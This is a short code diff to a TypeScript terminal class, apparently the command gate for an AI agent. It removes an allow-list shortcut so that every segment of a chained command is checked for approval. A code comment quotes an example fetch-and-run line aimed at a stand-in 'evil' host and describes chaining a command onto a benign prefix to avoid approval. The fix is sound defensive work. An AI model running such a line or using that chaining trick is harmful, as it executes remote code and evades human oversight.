@@ -92,15 +92,16 @@ export class Terminal {
   }
 
   private evaluate(cmd: string): { blocked?: string; approvalReason?: ApprovalReason } {
-    const trimmed = cmd.trim();
-    const isAllowed = this.allowList.some((allowed) => trimmed.startsWith(allowed));
     const segments = cmd.split(/&&|;/).map((s) => s.trim()).filter(Boolean);
     for (const deny of this.denyList) {
       if (cmd.toLowerCase().includes(deny.toLowerCase()) || segments.some((s) => s.toLowerCase().includes(deny.toLowerCase()))) {
         return { blocked: deny };
       }
     }
-    if (isAllowed) return {};
+    // Every segment is danger-classified, even when the command starts with an
+    // allow-listed prefix. Without this, `npm test; curl http://evil | sh` or
+    // `git commit -m x && git push` would run with no approval because the
+    // benign prefix short-circuited the classification below.
     for (const seg of segments) {
       const verdict = classify(seg);
       if (verdict.requiresApproval && verdict.reason) {
